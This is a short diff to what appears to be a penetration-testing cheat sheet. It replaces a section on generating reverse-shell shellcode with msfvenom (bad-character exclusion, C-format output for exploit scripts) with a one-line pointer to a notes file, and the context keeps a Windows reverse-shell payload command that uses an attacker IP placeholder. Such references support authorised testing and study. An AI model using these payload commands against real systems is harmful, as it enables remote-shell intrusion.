@@ -368,13 +368,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
 # Common -f formats: exe, elf, raw, war, asp, aspx, jsp, psh (powershell), dll, macho
 ```
 
-### Raw shellcode for BOF/exploit-dev (bad-char avoidance)
-```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
-  -b '\x00\x0a\x0d' -f c -o shellcode.txt
-```
-- `-b '<bad chars>'` excludes bytes that break the target's input handling (e.g. `\x00\x0a\x0d`) — determine the full bad-char list first with a `\x00-\xff` bytearray send + response comparison before generating final shellcode.
-- `-f c` (or `-f python`/`-f raw`) for pasting into an exploit script rather than a standalone binary.
+Raw shellcode for exploit adaptation: `msfvenom -p windows/shell_reverse_tcp ... -b '\x00\x0a\x0d' -f c` — see [`notes/public-exploit-adaptation.md`](notes/public-exploit-adaptation.md) for the full workflow.
 
 ---
 
